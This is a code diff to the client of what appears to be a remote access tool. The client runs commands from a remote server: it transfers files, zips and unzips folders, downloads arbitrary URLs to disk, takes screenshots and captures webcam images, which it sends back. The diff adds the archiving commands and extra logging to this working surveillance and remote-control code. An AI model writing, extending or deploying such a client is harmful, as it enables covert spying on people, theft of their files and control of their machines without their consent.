@@ -3,6 +3,7 @@ import json
 import logging
 import os
 import platform
+import shutil
 import socket
 import subprocess
 import sys
@@ -11,14 +12,14 @@ import time
 import traceback
 from io import BytesIO, StringIO
 from pydoc import help
+from zipfile import ZipFile
 
+import cv2
 import psutil
 import pyperclip
 import pyscreeze
 import requests
 from cryptography.fernet import Fernet
-
-import cv2
 
 if getattr(sys, 'frozen', False):
     CLIENT_PATH = os.path.dirname(sys.executable)
@@ -372,11 +373,44 @@ class Client(object):
                 self.send_file(data[1])
                 continue
 
-            if data[0] == 'SEND FILE':
+            if data[0] == 'SEND_FILE':
                 self.receive_file(data[1])
                 continue
 
+            if data[0] == 'ZIP_FILE':
+                logging.info('Zipping File: {}'.format(data[2]))
+                try:
+                    with ZipFile(data[1], 'w') as ziph:
+                        ziph.write(data[2])
+                except Exception as e:
+                    self.send(json_dumps([False, errors(e)]))
+                    continue
+                self.send(json_dumps([True, None]))
+                continue
+
+            if data[0] == 'ZIP_DIR':
+                logging.info('Zipping Folder: {}'.format(data[2]))
+                try:
+                    shutil.make_archive(data[1], 'zip', data[2])
+                except Exception as e:
+                    self.send(json_dumps([False, errors(e)]))
+                    continue
+                self.send(json_dumps([True, None]))
+                continue
+
+            if data[0] == 'UNZIP':
+                logging.info('Unzipping: {}'.format(data[1]))
+                try:
+                    with ZipFile(data[1], 'r') as ziph:
+                        ziph.extractall()
+                except Exception as e:
+                    self.send(json_dumps([False, errors(e)]))
+                    continue
+                self.send(json_dumps([True, None]))
+                continue
+
             if data[0] == 'DOWNLOAD':
+                logging.info('Downloading "{}" from {}'.format(data[2], data[1]))
                 try:
                     r = requests.get(data[1])
                     with open(data[2], 'wb') as f:
@@ -393,6 +427,7 @@ class Client(object):
                 continue
 
             if data[0] == 'SCREENSHOT':
+                logging.info('Taking Screenshot')
                 try:
                     with BytesIO() as output:
                         img = pyscreeze.screenshot()
@@ -404,10 +439,10 @@ class Client(object):
                     self.send(errors(e).encode())
                     continue
                 self.send(content)
-                logging.info('Sent Screenshot to Server')
                 continue
 
             if data[0] == 'WEBCAM':
+                logging.info('Capturing Webcam')
                 vc = cv2.VideoCapture(0)
                 s, img = vc.read()
                 vc.release()
